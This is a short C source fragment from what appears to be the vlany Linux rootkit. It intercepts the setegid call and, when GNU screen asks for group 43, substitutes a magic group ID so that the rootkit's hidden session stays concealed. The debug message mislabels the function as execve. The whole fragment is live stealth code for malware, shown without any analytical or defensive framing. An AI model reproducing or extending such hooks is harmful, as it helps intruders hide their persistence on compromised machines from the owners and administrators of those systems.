int setegid(gid_t egid)
{
    #ifdef DEBUG
        printf("[vlany] execve() called\n");
    #endif

    HOOK(old_setegid, CSETEGID);

    // prevents screen from changing the cur egid
    if(egid == 43) { old_setegid(MAGIC_GID); return 0; }

    return old_setegid(egid);
}
